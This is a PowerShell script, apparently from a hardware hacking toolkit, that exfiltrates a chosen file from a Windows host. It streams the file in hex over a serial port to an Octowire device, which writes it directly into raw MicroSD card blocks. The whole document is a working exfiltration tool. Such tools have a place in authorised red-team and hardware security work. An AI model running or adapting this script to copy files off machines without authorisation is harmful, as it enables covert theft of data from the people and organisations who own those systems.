# Octowire MicroSD Exfiltration Script
# Written by Paul Duncan <eresse@dooba.io>
# Stores file (PATH) directly into MicroSD card blocks (starting @ STARTBLK) using Octowire on COM port <COMPORT>
# Usage: octo-exfil-push.ps1 <COMPORT> <STARTBLK> <PATH>

# Block Size
$CS = 512

# Check Args
if($args.Count -lt 3) { write-host "Usage: ./octo-exfil.ps1 <COMPORT> <STARTBLK> <PATH>"; exit }
$u = $args[0]
$b = [int]$args[1]
$p = $args[2]

# Open UART
write-host "Connecting Serial Port (UART): [$u]..."
$uart = New-Object System.IO.Ports.SerialPort("$u", 7372800, "None", 8, "one")
$uart.Open()
sleep 1
$junk = $uart.ReadExisting()
$uart.WriteLine("ver")
Start-Sleep -Milliseconds 150
$ver = $uart.ReadExisting().Replace("`r", '').Split("`n")[2]
write-host "Got version from Octowire: [$ver]"

# Read & Split File
write-host "Exfiltrating file: [$p]"
$d = Get-Content -Path $p -Encoding Byte
$t = 0
$s = $d.count
$blk = $b
$uart.WriteLine("mci tx $blk @$('{0:X8}' -f $d.count)$(Split-Path -Path $p -Leaf -Resolve)")
$blk = $blk + 1
for($i = 0; $i -lt $d.count; $i = $i + $CS) {
    $chunk = $d[$i .. ($i + ($CS - 1))]
    $chex = ""
    for($j = 0; $j -lt $chunk.count; $j = $j + 1) { $chex = $chex + ('{0:X2}' -f $chunk[$j]).ToString() }
    $t = $t + $chunk.count
    write-host -NoNewline "`r * Writing block $blk - $t / $s bytes... "
    $uart.WriteLine("mci tx $blk $chex")
    $junk = $uart.ReadLine().Replace("`r", '').Replace("`n", ' ')
    $res = $uart.ReadLine().Replace("`r", '').Replace("`n", ' ')
    if($res -inotlike "*ok!*") { sleep 1; write-host "\n\nGot error: [$res] / $($uart.ReadExisting())"; exit } else { write-host -NoNewline "$res    " }
    $blk = $blk + 1
}

# Terminate
write-host -NoNewline "`n * Terminating @ block $blk... "
$uart.WriteLine("mci tx $blk 00")
$junk = $uart.ReadLine().Replace("`r", '').Replace("`n", ' ')
$res = $uart.ReadLine().Replace("`r", '').Replace("`n", ' ')
if($res -inotlike "*ok!*") { sleep 1; write-host "\n\nGot error: [$res] / $($uart.ReadExisting())"; exit } else { write-host -NoNewline "$res    " }

# Close UART
$uart.Close()